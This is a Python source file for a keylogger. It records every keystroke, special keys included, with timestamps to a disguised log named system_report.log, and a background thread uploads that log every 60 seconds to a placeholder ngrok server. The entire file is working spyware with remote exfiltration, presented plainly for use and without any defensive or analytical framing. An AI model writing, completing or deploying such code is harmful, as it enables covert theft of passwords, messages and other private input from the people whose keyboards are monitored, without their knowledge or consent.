import requests
from pynput import keyboard
import logging
from datetime import datetime

# Configure logging to store keystrokes locally
LOG_FILE = "C:\\Temp\\system_report.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(message)s'
)

# Replace with your ngrok public URL
SERVER_URL = "https://your-ngrok-url.ngrok.io/upload"  # Replace with your actual ngrok URL

# Function to send the log file to your server
def send_log_file():
    try:
        with open(LOG_FILE, "rb") as f:
            response = requests.post(SERVER_URL, files={"file": f})
            print(f"Log file sent: {response.status_code}")
    except Exception as e:
        print(f"Failed to send log file: {e}")

# Function triggered on key press
def on_press(key):
    try:
        # Handle alphanumeric keys
        logged_char = key.char
    except AttributeError:
        # Handle special keys (Shift, Ctrl, etc.)
        logged_char = f"[{key.name.upper()}]"
    
    # Add timestamp and log the key
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logging.info(f"{timestamp} - {logged_char}")

# Periodically send the log file (every 60 seconds)
def periodic_file_transfer():
    import time
    while True:
        time.sleep(60)  # Wait for 60 seconds
        send_log_file()

# Start keylogging and periodic file transfer in parallel
if __name__ == "__main__":
    from threading import Thread

    # Start the keylogger listener
    listener_thread = Thread(target=lambda: keyboard.Listener(on_press=on_press).join())
    listener_thread.start()

    # Start periodic file transfer
    transfer_thread = Thread(target=periodic_file_transfer)
    transfer_thread.start()
